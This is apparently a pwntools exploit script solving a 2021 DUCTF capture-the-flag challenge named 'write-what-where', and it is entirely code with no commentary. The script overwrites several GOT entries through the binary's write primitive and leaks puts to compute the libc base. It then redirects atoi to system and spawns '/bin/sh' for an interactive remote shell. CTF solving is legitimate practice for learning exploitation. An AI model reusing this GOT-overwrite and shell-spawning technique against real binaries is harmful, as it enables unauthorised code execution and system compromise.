from pwn import *
#p=process('./write-what-where')
p=remote('pwn-2021.duc.tf',31920)
elf = ELF('./write-what-where')
libc = ELF('libc.so.6')
#libc = ELF('libc6_2.31-0ubuntu9.1_amd64.so')
#raw_input("DEBUG")

got_exit = 0x404038
main_33 = 0x00000000004011ca
plt_puts = 0x401030
got_puts = 0x404018
got_atoi = 0x404030
__bss = 0x404080
main = 0x00000000004011a9
main_72 = 0x00000000004011f1
got_stdin = 0x404060
start = 0x0000000000401080
#e1c410

p.sendafter("what?\n", p32(main_33))
p.sendafter("where?\n", str(got_exit))
got_setvbuf = 0x404028

p.sendafter("what?\n", p32(plt_puts))
p.sendafter("where?\n", str(got_setvbuf))


p.sendafter("what?\n", p32(0))
p.sendlineafter("where?\n", str(got_setvbuf+4))

p.sendafter("what?\n", p32(got_puts))
p.sendlineafter("where?\n", str(got_stdin))

p.sendafter("what?\n", p32(0))
p.sendlineafter("where?\n", str(got_stdin+4))


p.sendafter("what?\n", p32(main))
p.sendlineafter("where?\n", str(got_exit))

puts = u64(p.recv(6).ljust(0x8,b'\x00'))
log.info("Puts: "+hex(puts))
libc_base = puts - libc.symbols['puts']
log.info("libc_base: "+hex(libc_base))
system = libc_base + libc.symbols['system']
log.info("system: "+hex(system))
stdin = libc_base + libc.symbols['_IO_2_1_stdin_']
stdout = libc_base + libc.symbols['_IO_2_1_stdout_']
log.info("stdin: "+hex(stdin))
log.info("stdout: "+hex(stdout))


p.sendafter("what?\n", p32(main_33))
p.sendafter("where?\n", str(got_exit))


a = int(hex(stdin)[:6],16)
b = int("0x"+hex(stdin)[6:],16)

p.sendafter("what?\n", p32(b))
p.sendlineafter("where?\n", str(got_stdin))

p.sendafter("what?\n", p32(a))
p.sendlineafter("where?\n", str(got_stdin+4))

p.sendafter("what?\n", p32(start))
p.sendlineafter("where?\n", str(got_exit))

p.sendafter("what?\n", p64(system)[:-4])
p.sendlineafter("where?\n", str(got_atoi))

p.sendafter("what?\n", b'\x00')
p.sendlineafter("where?\n", b'/bin/sh\x00')

p.interactive()